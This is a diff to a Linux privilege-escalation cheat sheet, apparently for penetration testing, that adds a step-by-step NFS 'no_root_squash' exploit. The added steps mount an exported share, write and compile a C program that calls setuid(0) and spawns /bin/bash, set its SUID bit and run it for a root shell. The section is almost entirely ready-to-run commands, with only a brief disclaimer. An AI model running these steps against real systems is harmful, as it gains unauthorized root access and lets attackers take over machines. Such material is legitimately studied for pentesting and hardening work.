@@ -204,9 +204,63 @@ To exploit a binary like `/usr/local/bin/suid-so`, you can use shared object inj
 ```sh
 ./usr/local/bin/suid-so
 ```
-```
 
-### Disclaimer 🚨
+## NFS Root Squashing Exploit
+
+### Overview
+This guide explains how to exploit NFS (Network File System) root squashing to gain root access. 
+
+### Steps
+
+1. **Check `/etc/exports`**:
+   ```sh
+   cat /etc/exports
+   ```
+   Look for entries like:
+   ```
+   <folder_name> *(no_root_squash)
+   ```
+   This indicates the folder is shareable and can be mounted.
+
+2. **Show mounted directories**:
+   ```sh
+   showmount -e <IP>
+   ```
+   It should display the same `<folder_name>`.
+
+3. **Create a mount point**:
+   ```sh
+   mkdir -p /mnt/<folder_name>
+   ```
+
+4. **Mount the NFS share**:
+   ```sh
+   mount -o rw,vers=2 <IP>:/<folder_name> /mnt/<folder_name>
+   ```
+   - `rw`: Read and write access
+   - `vers=2`: Use NFS version 2
+
+5. **Create a C program for privilege escalation**:
+   ```sh
+   echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /mnt/<folder_name>/x.c
+   ```
+
+6. **Compile the C program**:
+   ```sh
+   gcc /mnt/<folder_name>/x.c -o /mnt/<folder_name>/x
+   ```
+
+7. **Set the SUID bit**:
+   ```sh
+   chmod +s /mnt/<folder_name>/x
+   ```
+
+8. **Execute the compiled binary**:
+   ```sh
+   cd /mnt/<folder_name>
+   ./x
+   ```
+   This will escalate privileges to root. You should now have a root shell.
 
 ⚠️ **Disclaimer:** The above content is not owned by me. It has been sourced from the internet for educational purposes only. I do not claim ownership or responsibility for the content provided. Please use it responsibly and in accordance with applicable laws and ethical guidelines.
 
